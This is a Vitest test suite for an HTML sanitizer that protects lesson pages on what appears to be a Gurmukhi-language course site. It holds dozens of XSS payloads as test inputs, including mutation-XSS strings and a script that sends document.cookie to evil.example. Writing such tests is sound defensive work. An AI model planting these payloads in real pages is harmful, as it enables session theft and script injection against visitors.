import { describe, it, expect } from "vitest";
import { sanitizeLessonHtml } from "../functions/api/_sanitize-html.js";

// Lesson HTML written in the course authoring studio is rendered later via
// Astro's `set:html` — raw injection into every visitor's page. sanitizeLessonHtml
// is the only thing standing between a hostile teacher account and stored XSS,
// so these tests are written as attacks, not as feature checks.
//
// Rule for this file: when a payload is ambiguous, the expectation is the
// CONSERVATIVE outcome (drop it). Never relax an expectation to make a test
// pass — fix the sanitizer.

/** Structural assertion: nothing in `out` can execute in a browser. */
function expectInert(out: string) {
  // No dangerous element ever survives, in any casing or with any whitespace
  // between `<` and the name.
  expect(out).not.toMatch(
    /<\s*\/?\s*(script|style|iframe|object|embed|applet|svg|math|form|input|button|img|link|meta|base|template|textarea|frame|frameset|noscript)\b/i
  );
  // No event-handler attribute survives on any tag.
  expect(out).not.toMatch(/\son[a-z]+\s*=/i);
  // No executable or inline-content URL scheme survives.
  expect(out).not.toMatch(/javascript\s*:/i);
  expect(out).not.toMatch(/\bdata\s*:/i);
  expect(out).not.toMatch(/vbscript\s*:/i);
  // No unescaped raw `<` other than the ones opening allowlisted tags.
  const stray = out.replace(
    /<\/?(?:p|h2|h3|h4|ul|ol|li|strong|em|blockquote|a|table|thead|tbody|tr|th|td|span|br)(?:\s[^>]*)?>/g,
    ""
  );
  expect(stray).not.toContain("<");
}

// ---------------------------------------------------------------------------
// 1. <script> can never survive, however it is delivered
// ---------------------------------------------------------------------------
describe("1. script elements", () => {
  it("drops a bare script element and its body", () => {
    expect(sanitizeLessonHtml("<script>alert(1)</script>")).toBe("");
  });

  it("drops a script nested inside an allowed tag, keeping the surrounding text", () => {
    expect(sanitizeLessonHtml("<p>Hello <script>alert(1)</script>world</p>")).toBe(
      "<p>Hello world</p>"
    );
  });

  it("drops a script with attributes and a src", () => {
    expect(sanitizeLessonHtml('<script src="https://evil.example/x.js"></script>')).toBe("");
  });

  it("drops a script whose body contains markup and quotes", () => {
    const out = sanitizeLessonHtml(`<p>a</p><script>var s = "</p><b>";alert(1)</script><p>b</p>`);
    expectInert(out);
    expect(out).not.toContain("alert");
  });

  it("drops an unterminated script rather than resyncing after it", () => {
    const out = sanitizeLessonHtml("<p>keep</p><script>alert(1)");
    expectInert(out);
    expect(out).not.toContain("alert");
    expect(out).toContain("keep");
  });

  it("drops a script split across a malformed outer tag (<scr<script>ipt>)", () => {
    const out = sanitizeLessonHtml("<scr<script>ipt>alert(1)</scr</script>ipt>");
    expectInert(out);
  });

  it("drops a script hidden behind a stray left angle bracket", () => {
    const out = sanitizeLessonHtml("<<script>script>alert(1)<</script>/script>");
    expectInert(out);
  });

  it("drops script regardless of casing", () => {
    expect(sanitizeLessonHtml("<ScRiPt>alert(1)</sCrIpT>")).toBe("");
    expect(sanitizeLessonHtml("<SCRIPT>alert(1)</SCRIPT>")).toBe("");
  });

  it("drops script when the close tag is uppercase and the open tag is not", () => {
    expect(sanitizeLessonHtml("<script>alert(1)</SCRIPT><p>x</p>")).toBe("<p>x</p>");
  });

  it("drops <script/xss src=...> whitespace/slash evasion", () => {
    const out = sanitizeLessonHtml("<script/xss src=https://evil.example/x.js>alert(1)</script>");
    expect(out).toBe("");
  });

  it("drops a script separated from its name by a newline in the close tag", () => {
    const out = sanitizeLessonHtml("<script>alert(1)</script\n><p>x</p>");
    expectInert(out);
    expect(out).not.toContain("alert");
  });

  it("drops nested script-in-script attempts", () => {
    const out = sanitizeLessonHtml("<script><script>alert(1)</script></script>");
    expectInert(out);
    expect(out).not.toContain("alert");
  });
});

// ---------------------------------------------------------------------------
// 2. on* event handlers, on any tag, allowed or not
// ---------------------------------------------------------------------------
describe("2. event-handler attributes", () => {
  it("strips onerror from a disallowed tag (whole tag goes)", () => {
    expect(sanitizeLessonHtml('<img src="x" onerror="alert(1)">')).toBe("");
  });

  it("strips onclick from an allowed tag, keeping the tag and text", () => {
    expect(sanitizeLessonHtml(`<p onclick="alert(1)">text</p>`)).toBe("<p>text</p>");
  });

  it("strips every on* handler in a multi-handler tag", () => {
    const out = sanitizeLessonHtml(
      `<td onmouseover="a()" onload="b()" onfocus="c()" ONBLUR="d()">cell</td>`
    );
    expect(out).toBe("<td>cell</td>");
  });

  it("strips handlers written in mixed case", () => {
    expect(sanitizeLessonHtml(`<p OnClIcK="alert(1)">t</p>`)).toBe("<p>t</p>");
  });

  it("strips an unquoted handler value", () => {
    expect(sanitizeLessonHtml("<p onclick=alert(1)>t</p>")).toBe("<p>t</p>");
  });

  it("strips a handler with whitespace around the equals sign", () => {
    expect(sanitizeLessonHtml(`<p onclick = "alert(1)">t</p>`)).toBe("<p>t</p>");
  });

  it("strips a handler with a newline between name and equals", () => {
    expect(sanitizeLessonHtml('<p onclick\n=\n"alert(1)">t</p>')).toBe("<p>t</p>");
  });

  it("strips a handler on an <a> that also has a legitimate href", () => {
    expect(sanitizeLessonHtml(`<a href="https://ok.example/x" onclick="evil()">t</a>`)).toBe(
      `<a href="https://ok.example/x">t</a>`
    );
  });

  it("strips a handler on a Gurmukhi span", () => {
    expect(sanitizeLessonHtml(`<span class="gur" onmouseover="evil()">ਸਤਿ</span>`)).toBe(
      `<span class="gur">ਸਤਿ</span>`
    );
  });
});

// ---------------------------------------------------------------------------
// 3. javascript:/data: URIs, in href and in every other attribute
// ---------------------------------------------------------------------------
describe("3. dangerous URI schemes", () => {
  const badHrefs = [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "  javascript:alert(1)",
    "java\tscript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "&#106;avascript:alert(1)",
    "&#x6a;avascript:alert(1)",
    "http://insecure.example/x",
    "//protocol-relative.example/x",
    "/relative/path",
    "relative.html",
    "mailto:someone@example.com",
    "#anchor",
    "https:/only-one-slash.example",
    "httpss://typo.example",
    "ftp://files.example/x",
  ];

  for (const href of badHrefs) {
    it(`drops the href attribute for ${JSON.stringify(href)} but keeps the <a>`, () => {
      const out = sanitizeLessonHtml(`<a href="${href}">link text</a>`);
      expect(out).toBe("<a>link text</a>");
      expectInert(out);
    });
  }

  it("keeps a plain https href", () => {
    expect(sanitizeLessonHtml(`<a href="https://www.sikhri.org/x">t</a>`)).toBe(
      `<a href="https://www.sikhri.org/x">t</a>`
    );
  });

  it("accepts an uppercase HTTPS scheme", () => {
    expect(sanitizeLessonHtml(`<a href="HTTPS://ok.example/p">t</a>`)).toBe(
      `<a href="HTTPS://ok.example/p">t</a>`
    );
  });

  it("trims surrounding whitespace on an otherwise valid https href", () => {
    expect(sanitizeLessonHtml(`<a href="   https://ok.example/p  ">t</a>`)).toBe(
      `<a href="https://ok.example/p">t</a>`
    );
  });

  it("preserves &amp; in a legitimate https query string", () => {
    expect(sanitizeLessonHtml(`<a href="https://ok.example/r?src=sggs&amp;ang=1">t</a>`)).toBe(
      `<a href="https://ok.example/r?src=sggs&amp;ang=1">t</a>`
    );
  });

  it("drops href on tags other than <a>", () => {
    expect(sanitizeLessonHtml(`<p href="https://ok.example/">t</p>`)).toBe("<p>t</p>");
  });

  it("drops javascript: hidden in a non-href attribute", () => {
    const out = sanitizeLessonHtml(`<p style="background:url(javascript:alert(1))">t</p>`);
    expect(out).toBe("<p>t</p>");
    expectInert(out);
  });

  it("drops data: hidden in src/srcset/formaction/xlink:href", () => {
    for (const attr of ["src", "srcset", "formaction", "xlink:href", "action", "poster"]) {
      const out = sanitizeLessonHtml(`<td ${attr}="data:text/html,<script>alert(1)</script>">c</td>`);
      expect(out).toBe("<td>c</td>");
      expectInert(out);
    }
  });

  it("keeps the first valid href and ignores a duplicate hostile one", () => {
    const out = sanitizeLessonHtml(
      `<a href="https://ok.example/" href="javascript:alert(1)">t</a>`
    );
    expect(out).toBe(`<a href="https://ok.example/">t</a>`);
    expectInert(out);
  });

  it("drops a hostile first href even when a valid one follows", () => {
    const out = sanitizeLessonHtml(
      `<a href="javascript:alert(1)" href="https://ok.example/">t</a>`
    );
    expectInert(out);
    expect(out).not.toContain("javascript");
  });
});

// ---------------------------------------------------------------------------
// 4. disallowed tags removed, surrounding safe content intact
// ---------------------------------------------------------------------------
describe("4. disallowed elements", () => {
  it("drops <style> together with its CSS body", () => {
    const out = sanitizeLessonHtml("<p>a</p><style>body{background:url(//evil)}</style><p>b</p>");
    expect(out).toBe("<p>a</p><p>b</p>");
  });

  it("drops <iframe> and its fallback content", () => {
    expect(sanitizeLessonHtml('<p>a</p><iframe src="https://evil.example"></iframe><p>b</p>')).toBe(
      "<p>a</p><p>b</p>"
    );
  });

  it("drops <object> and <embed>", () => {
    expect(sanitizeLessonHtml('<p>a</p><object data="x.swf">fallback</object><p>b</p>')).toBe(
      "<p>a</p><p>b</p>"
    );
    expect(sanitizeLessonHtml('<p>a</p><embed src="x.swf"><p>b</p>')).toBe("<p>a</p><p>b</p>");
  });

  it("drops an <svg> that smuggles a script through <foreignObject>", () => {
    const out = sanitizeLessonHtml(
      "<p>before</p><svg><foreignObject><script>alert(1)</script></foreignObject></svg><p>after</p>"
    );
    expect(out).toBe("<p>before</p><p>after</p>");
    expectInert(out);
  });

  it("drops an <svg> using the onload attribute vector", () => {
    const out = sanitizeLessonHtml('<svg onload="alert(1)"><circle r="1"/></svg><p>x</p>');
    expect(out).toBe("<p>x</p>");
    expectInert(out);
  });

  it("drops nested svg without letting the inner close tag end the outer drop", () => {
    const out = sanitizeLessonHtml(
      '<svg><svg></svg><script>alert(1)</script></svg><p>survivor</p>'
    );
    expect(out).toBe("<p>survivor</p>");
    expectInert(out);
  });

  it("drops <math> action vectors", () => {
    const out = sanitizeLessonHtml(
      '<p>a</p><math><maction actiontype="statusline#javascript:alert(1)">x</maction></math><p>b</p>'
    );
    expect(out).toBe("<p>a</p><p>b</p>");
    expectInert(out);
  });

  it("unwraps <form>/<input>/<button>, keeping their text", () => {
    const out = sanitizeLessonHtml(
      '<form action="https://evil.example"><input name="x" value="y"><button onclick="evil()">Go</button></form>'
    );
    expect(out).toBe("Go");
    expectInert(out);
  });

  it("drops <img> entirely — it is void, so there is no inner text to keep", () => {
    expect(sanitizeLessonHtml('<p>a<img src="x.png" alt="pic">b</p>')).toBe("<p>ab</p>");
  });

  it("unwraps a <div> wrapper but keeps its allowed children", () => {
    expect(sanitizeLessonHtml('<div class="mt-6"><h4>Homework</h4><p>Write 200 words.</p></div>')).toBe(
      "<h4>Homework</h4><p>Write 200 words.</p>"
    );
  });

  it("unwraps inline tags that are not on the allowlist but keeps their text", () => {
    expect(sanitizeLessonHtml("<p>a <b>bold</b> and <i>ital</i> and <code>c</code></p>")).toBe(
      "<p>a bold and ital and c</p>"
    );
  });

  it("drops <template>, <textarea>, <noscript> and their contents", () => {
    expect(sanitizeLessonHtml("<p>a</p><template><script>alert(1)</script></template><p>b</p>")).toBe(
      "<p>a</p><p>b</p>"
    );
    expect(sanitizeLessonHtml("<p>a</p><textarea></textarea><p>b</p>")).toBe("<p>a</p><p>b</p>");
    expect(sanitizeLessonHtml("<p>a</p><noscript><p>js off</p></noscript><p>b</p>")).toBe(
      "<p>a</p><p>b</p>"
    );
  });

  it("drops <base>, <link> and <meta> refresh vectors", () => {
    const out = sanitizeLessonHtml(
      '<base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example"><p>x</p>'
    );
    expect(out).toBe("<p>x</p>");
    expectInert(out);
  });
});

// ---------------------------------------------------------------------------
// 5. malformed input, filter evasion, truncation
// ---------------------------------------------------------------------------
describe("5. malformed input and filter evasion", () => {
  it("never throws on arbitrary garbage", () => {
    const junk = [
      "<",
      ">",
      "</",
      "</>",
      "<>",
      "<<<<",
      "<p",
      "<p ",
      "<p attr",
      "<p attr=",
      `<p attr="`,
      "<p attr='",
      "<!",
      "<!-",
      "<!--",
      "<!--x",
      "<?php echo 1; ?>",
      "<!DOCTYPE html>",
      "a < b > c",
      "</p></p></p>",
      "<p><p><p>",
      "<a href",
      "=<>=",
      "<p/></p/>",
    ];
    for (const j of junk) {
      expect(() => sanitizeLessonHtml(j)).not.toThrow();
      expectInert(sanitizeLessonHtml(j));
    }
  });

  it("strips HTML comments entirely, including hidden script payloads", () => {
    expect(sanitizeLessonHtml("<!--<script>alert(1)</script>-->")).toBe("");
    expect(sanitizeLessonHtml("<p>a</p><!-- a note --><p>b</p>")).toBe("<p>a</p><p>b</p>");
    expect(sanitizeLessonHtml("<p>a</p><!--><p>b</p>")).toBe("<p>a</p><p>b</p>");
  });

  it("strips a comment closed with the --!> variant", () => {
    expect(sanitizeLessonHtml("<p>a</p><!-- x --!><p>b</p>")).toBe("<p>a</p><p>b</p>");
  });

  it("drops the remainder of the input for an unterminated comment", () => {
    const out = sanitizeLessonHtml("<p>a</p><!-- <script>alert(1)</script>");
    expect(out).toBe("<p>a</p>");
    expectInert(out);
  });

  it("strips doctypes and processing instructions", () => {
    expect(sanitizeLessonHtml("<!DOCTYPE html><p>x</p>")).toBe("<p>x</p>");
    expect(sanitizeLessonHtml('<?xml version="1.0"?><p>x</p>')).toBe("<p>x</p>");
  });

  it("neutralises NUL-byte evasion", () => {
    const nul = String.fromCharCode(0);
    expect(sanitizeLessonHtml(`<scr${nul}ipt>alert(1)</scr${nul}ipt>`)).toBe("");
    const out = sanitizeLessonHtml(`<img src=x on${nul}error=alert(1)>`);
    expect(out).toBe("");
    expectInert(out);
  });

  it("does not decode double-encoded payloads into live markup", () => {
    const out = sanitizeLessonHtml("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>");
    expect(out).toBe("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>");
    expectInert(out);
  });

  it("does not resurrect &amp;lt;script&amp;gt; through a second pass", () => {
    const once = sanitizeLessonHtml("<p>&amp;lt;script&amp;gt;</p>");
    expect(sanitizeLessonHtml(once)).toBe(once);
    expectInert(once);
  });

  it("treats a lone < in prose as text", () => {
    expect(sanitizeLessonHtml("<p>1 < 2 and 3 > 2</p>")).toBe("<p>1 &lt; 2 and 3 &gt; 2</p>");
  });

  it("balances mismatched nesting", () => {
    expect(sanitizeLessonHtml("<em><strong>x</em></strong>")).toBe("<em><strong>x</strong></em>");
  });

  it("closes unclosed allowed tags at the end of input", () => {
    expect(sanitizeLessonHtml("<blockquote><p>unfinished")).toBe(
      "<blockquote><p>unfinished</p></blockquote>"
    );
  });

  it("ignores stray end tags with nothing open", () => {
    expect(sanitizeLessonHtml("</p></strong><p>x</p></em>")).toBe("<p>x</p>");
  });

  it("truncates rather than resyncing when a tag has an unterminated quote", () => {
    const out = sanitizeLessonHtml(`<p>keep</p><a href="https://x.example`);
    expect(out).toBe("<p>keep</p>");
    expectInert(out);
  });

  it("truncates on a tag that never closes its angle bracket", () => {
    const out = sanitizeLessonHtml("<p>keep</p><script src=https://evil.example");
    expect(out).toBe("<p>keep</p>");
    expectInert(out);
  });

  it("handles deeply nested unclosed tags without throwing", () => {
    const deep = "<p>".repeat(500) + "x";
    const out = sanitizeLessonHtml(deep);
    expect(out.endsWith("</p>")).toBe(true);
    expectInert(out);
  });

  it("is idempotent across a corpus of hostile inputs", () => {
    const corpus = [
      "<script>alert(1)</script>",
      "<p>Hello <script>alert(1)</script>world</p>",
      `<a href="javascript:alert(1)">t</a>`,
      `<a href="https://ok.example/?a=1&amp;b=2">t</a>`,
      "<em><strong>x</em></strong>",
      "<p>1 < 2 &amp; 3</p>",
      '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
      "<!--<script>-->",
      `<span class="gur" lang="pa">ਵਾਹਿਗੁਰੂ</span>`,
      "<div><p>a<br>b</p></div>",
    ];
    for (const input of corpus) {
      const once = sanitizeLessonHtml(input);
      expect(sanitizeLessonHtml(once)).toBe(once);
    }
  });

  it("returns an empty string for non-string and empty input", () => {
    expect(sanitizeLessonHtml("")).toBe("");
    expect(sanitizeLessonHtml(null as any)).toBe("");
    expect(sanitizeLessonHtml(undefined as any)).toBe("");
    expect(sanitizeLessonHtml(42 as any)).toBe("");
    expect(sanitizeLessonHtml({} as any)).toBe("");
  });
});

// ---------------------------------------------------------------------------
// 6. entities, Unicode and Gurmukhi must survive intact
// ---------------------------------------------------------------------------
describe("6. entities and Unicode", () => {
  it("passes named and numeric entities through without double-encoding", () => {
    expect(sanitizeLessonHtml("<p>Tom &amp; Jerry &lt;3 &gt; &quot;q&quot; &#2581; &#x0A15;</p>")).toBe(
      "<p>Tom &amp; Jerry &lt;3 &gt; &quot;q&quot; &#2581; &#x0A15;</p>"
    );
  });

  it("escapes a bare ampersand that is not part of an entity", () => {
    expect(sanitizeLessonHtml("<p>Guru &  Sangat</p>")).toBe("<p>Guru &amp;  Sangat</p>");
    expect(sanitizeLessonHtml("<p>a &notanentity b</p>")).toBe("<p>a &amp;notanentity b</p>");
  });

  it("leaves Gurmukhi text byte-for-byte intact", () => {
    const gurmukhi = "ੴ ਸਤਿ ਨਾਮੁ ਕਰਤਾ ਪੁਰਖੁ ਨਿਰਭਉ ਨਿਰਵੈਰੁ ਅਕਾਲ ਮੂਰਤਿ ਅਜੂਨੀ ਸੈਭੰ ਗੁਰ ਪ੍ਰਸਾਦਿ ॥";
    expect(sanitizeLessonHtml(`<p>${gurmukhi}</p>`)).toBe(`<p>${gurmukhi}</p>`);
  });

  it("leaves other non-Latin scripts and emoji intact", () => {
    const mixed = "देवनागरी • العربية • 中文 • Ελληνικά • ☬";
    expect(sanitizeLessonHtml(`<p>${mixed}</p>`)).toBe(`<p>${mixed}</p>`);
  });

  it("keeps Gurmukhi inside text that also contains a stripped tag", () => {
    expect(sanitizeLessonHtml("<p>ਗੁਰਮਤਿ <script>alert(1)</script> ਸੇਵਾ</p>")).toBe(
      "<p>ਗੁਰਮਤਿ  ਸੇਵਾ</p>"
    );
  });
});

// ---------------------------------------------------------------------------
// 7. attribute-value breakout attempts
// ---------------------------------------------------------------------------
describe("7. attribute quoting and breakout", () => {
  it("does not let a single-quoted value smuggle a double-quoted handler", () => {
    const out = sanitizeLessonHtml(`<a href='https://x.example" onclick="evil()'>t</a>`);
    expect(out).toBe("<a>t</a>");
    expectInert(out);
  });

  it("does not let a double-quoted value smuggle a single-quoted handler", () => {
    const out = sanitizeLessonHtml(`<a href="https://x.example' onclick='evil()">t</a>`);
    expect(out).toBe("<a>t</a>");
    expectInert(out);
  });

  it("treats an unquoted value as ending at whitespace, so trailing junk is a separate attribute", () => {
    const out = sanitizeLessonHtml("<a href=https://x.example onerror=alert(1)>t</a>");
    expect(out).toBe(`<a href="https://x.example">t</a>`);
    expectInert(out);
  });

  it("handles an attribute that immediately follows a closing quote with no space", () => {
    const out = sanitizeLessonHtml(`<a href="https://x.example"onclick="evil()">t</a>`);
    expect(out).toBe(`<a href="https://x.example">t</a>`);
    expectInert(out);
  });

  it("does not let markup inside an attribute value terminate the tag", () => {
    const out = sanitizeLessonHtml(`<p title="</p><script>alert(1)</script>">visible</p>`);
    expect(out).toBe("<p>visible</p>");
    expectInert(out);
  });

  it("rejects an href containing raw whitespace or angle brackets", () => {
    expect(sanitizeLessonHtml(`<a href="https://x.example/a b">t</a>`)).toBe("<a>t</a>");
    expect(sanitizeLessonHtml(`<a href="https://x.example/<b>">t</a>`)).toBe("<a>t</a>");
    expect(sanitizeLessonHtml(`<a href="https://x.example/back\\slash">t</a>`)).toBe("<a>t</a>");
  });

  it("drops an href that hides a quote behind a character reference", () => {
    // An encoded quote cannot actually open a new attribute (the tokenizer fixes
    // attribute boundaries before it decodes references), but it has no
    // legitimate use in a citation URL, so we strip rather than reason about it.
    for (const enc of ["&quot;", "&#x22;", "&#34;", "&apos;", "&#39;", "&grave;"]) {
      const out = sanitizeLessonHtml(`<a href="https://x.example/${enc}onclick=${enc}evil()">t</a>`);
      expect(out).toBe("<a>t</a>");
      expectInert(out);
    }
  });

  it("drops an href that hides whitespace or angle brackets behind a reference", () => {
    for (const enc of ["&#32;", "&#x20;", "&#9;", "&Tab;", "&NewLine;", "&#10;", "&lt;", "&gt;", "&bsol;"]) {
      expect(sanitizeLessonHtml(`<a href="https://x.example/${enc}x">t</a>`)).toBe("<a>t</a>");
    }
  });

  it("does not recursively decode: &amp;#x22; is inert text, not a quote", () => {
    // A browser decodes an attribute value exactly once, so `&amp;#x22;` is the
    // literal string `&#x22;`. The URL stays valid and is kept verbatim.
    const out = sanitizeLessonHtml(`<a href="https://x.example/&amp;#x22;">t</a>`);
    expect(out).toBe(`<a href="https://x.example/&amp;#x22;">t</a>`);
    expectInert(out);
  });

  it("drops class values other than exactly gur, keeping the element", () => {
    expect(sanitizeLessonHtml(`<span class="cite">Kapur Singh</span>`)).toBe(
      "<span>Kapur Singh</span>"
    );
    expect(sanitizeLessonHtml(`<p class="gur extra">x</p>`)).toBe("<p>x</p>");
    expect(sanitizeLessonHtml(`<p class="btn btn-primary">x</p>`)).toBe("<p>x</p>");
  });

  it("drops lang values other than exactly pa", () => {
    expect(sanitizeLessonHtml(`<span lang="en">x</span>`)).toBe("<span>x</span>");
    expect(sanitizeLessonHtml(`<span lang="pa-IN">x</span>`)).toBe("<span>x</span>");
  });

  it("keeps class=gur and lang=pa on any allowed tag", () => {
    expect(sanitizeLessonHtml(`<span class="gur" lang="pa">ਸਤਿ</span>`)).toBe(
      `<span class="gur" lang="pa">ਸਤਿ</span>`
    );
    expect(sanitizeLessonHtml(`<blockquote class="gur">ਸਤਿ</blockquote>`)).toBe(
      `<blockquote class="gur">ਸਤਿ</blockquote>`
    );
    expect(sanitizeLessonHtml(`<p class='gur'>ਸਤਿ</p>`)).toBe(`<p class="gur">ਸਤਿ</p>`);
  });

  it("drops every other attribute on an allowed tag", () => {
    expect(
      sanitizeLessonHtml(`<p id="x" style="color:red" data-x="1" title="t" role="alert">t</p>`)
    ).toBe("<p>t</p>");
  });

  it("drops target and rel on links (not on the allowlist)", () => {
    expect(
      sanitizeLessonHtml(`<a href="https://x.example" target="_blank" rel="opener">t</a>`)
    ).toBe(`<a href="https://x.example">t</a>`);
  });
});

// ---------------------------------------------------------------------------
// 8. void / self-closing element confusion
// ---------------------------------------------------------------------------
describe("8. void and self-closing elements", () => {
  it("keeps <br> — the codebase's line-break convention (1,660 uses in courses.json)", () => {
    expect(sanitizeLessonHtml("<p>line one<br>line two</p>")).toBe("<p>line one<br>line two</p>");
  });

  it("normalises <br/> and <br /> to <br>", () => {
    expect(sanitizeLessonHtml("<p>a<br/>b</p>")).toBe("<p>a<br>b</p>");
    expect(sanitizeLessonHtml("<p>a<br />b</p>")).toBe("<p>a<br>b</p>");
  });

  it("drops attributes on <br> and never emits a stray </br>", () => {
    expect(sanitizeLessonHtml(`<p>a<br onclick="evil()">b</br></p>`)).toBe("<p>a<br>b</p>");
  });

  it("strips <hr> — unused anywhere in the corpus, so it stays off the allowlist", () => {
    expect(sanitizeLessonHtml("<p>a</p><hr><p>b</p>")).toBe("<p>a</p><p>b</p>");
    expect(sanitizeLessonHtml("<p>a</p><hr /><p>b</p>")).toBe("<p>a</p><p>b</p>");
  });

  it("treats <p/> as an open paragraph, matching the browser", () => {
    expect(sanitizeLessonHtml("<p/>text")).toBe("<p>text</p>");
  });

  it("handles a self-closing allowed tag with attributes", () => {
    expect(sanitizeLessonHtml(`<span class="gur"/>ਸਤਿ`)).toBe(`<span class="gur">ਸਤਿ</span>`);
  });

  it("does not let a self-closing disallowed container swallow the rest of the document", () => {
    expect(sanitizeLessonHtml("<svg/><p>survivor</p>")).toBe("<p>survivor</p>");
  });

  it("does not let void disallowed elements swallow the rest of the document", () => {
    for (const tag of ["img", "input", "embed", "frame", "col", "area", "source", "track", "wbr"]) {
      const out = sanitizeLessonHtml(`<${tag}><p>survivor</p>`);
      expect(out).toBe("<p>survivor</p>");
    }
  });
});

// ---------------------------------------------------------------------------
// Mutation-XSS: payloads that rely on a parser re-serialising markup differently
// than it read it. Our defence is that we never re-serialise attacker markup —
// we only ever emit tags we constructed ourselves from the allowlist.
// ---------------------------------------------------------------------------
describe("mutation-XSS style payloads", () => {
  const mxss = [
    `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
    `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`,
    `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`,
    `<xmp><img src=x onerror=alert(1)></xmp>`,
    `<noembed><img src=x onerror=alert(1)></noembed>`,
    `<plaintext><img src=x onerror=alert(1)>`,
    `<title><img src=x onerror=alert(1)></title>`,
    `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
    `<listing><img src=x onerror=alert(1)></listing>`,
    `<table><td background="javascript:alert(1)">x</td></table>`,
    `<details open ontoggle=alert(1)>`,
    `<marquee onstart=alert(1)>x</marquee>`,
    `<a/href="javascript:alert(1)">x</a>`,
    `<p/onclick=alert(1)>x</p>`,
    `<p on click=alert(1)>x</p>`,
    `<img/src="x"/onerror="alert(1)">`,
    `<img src=x onerror=alert(1)//>`,
    `<script>alert(1)<!--</script>-->`,
    `<!--[if IE]><script>alert(1)</script><![endif]-->`,
  ];

  for (const payload of mxss) {
    it(`neutralises ${JSON.stringify(payload).slice(0, 62)}`, () => {
      const out = sanitizeLessonHtml(payload);
      expectInert(out);
      expect(out).not.toMatch(/alert\s*\(/);
      // And a second pass must not resurrect anything.
      expect(sanitizeLessonHtml(out)).toBe(out);
    });
  }
});

// ---------------------------------------------------------------------------
// Round-trip: a realistic lesson must survive unchanged
// ---------------------------------------------------------------------------
describe("round-trip of a realistic lesson", () => {
  const lesson =
    "<h2>ਗੁਰਮਤਿ and the Ethic of ਸੇਵਾ</h2>" +
    "<p>The <strong>ਸੰਗਤ</strong> is not merely an audience; it is a <em>pedagogical space</em> in which ਹਉਮੈ is dissolved.</p>" +
    `<blockquote class="gur" lang="pa">ਸੇਵਾ ਕਰਤ ਹੋਇ ਨਿਹਕਾਮੀ ॥</blockquote>` +
    "<p>&#8220;Performing service, one becomes free of desire.&#8221; (ਸ੍ਰੀ ਗੁਰੂ ਗ੍ਰੰਥ ਸਾਹਿਬ ਜੀ, ਅੰਗ 286)</p>" +
    "<h3>Sources</h3>" +
    "<ul>" +
    `<li>Kapur Singh, <em>Parasaraprasna</em>. See <a href="https://www.sikhri.org/articles/parasaraprasna">the SikhRI edition</a>.</li>` +
    "<li>Mandair &amp; Shackle, <em>Teachings of the Sikh Gurus</em>.</li>" +
    "</ul>" +
    "<h4>Keywords</h4>" +
    "<table>" +
    "<thead><tr><th>Term</th><th>Academic Context</th></tr></thead>" +
    "<tbody>" +
    `<tr><td><span class="gur" lang="pa">ਗੁਰਮਤਿ</span></td><td>The teachings of the Guru.</td></tr>` +
    `<tr><td><span class="gur" lang="pa">ਹਉਮੈ</span></td><td>The ego-construct.</td></tr>` +
    "</tbody>" +
    "</table>" +
    "<ol><li>Read ਅੰਗ 286.</li><li>Write 200 words.</li></ol>";

  it("passes safe lesson HTML through unchanged", () => {
    expect(sanitizeLessonHtml(lesson)).toBe(lesson);
  });

  it("is idempotent on the realistic lesson", () => {
    expect(sanitizeLessonHtml(sanitizeLessonHtml(lesson))).toBe(lesson);
  });

  it("neutralises injected payloads while leaving the rest of the lesson intact", () => {
    const attacked =
      lesson.replace(
        "<h3>Sources</h3>",
        `<h3>Sources</h3><script>fetch('https://evil.example/'+document.cookie)</script><img src=x onerror=alert(1)><iframe src="javascript:alert(1)"></iframe>`
      ) + `<a href="javascript:alert(document.domain)">click</a><!--<script>alert(1)</script>-->`;

    const out = sanitizeLessonHtml(attacked);
    expectInert(out);
    expect(out).toBe(lesson + "<a>click</a>");
  });
});
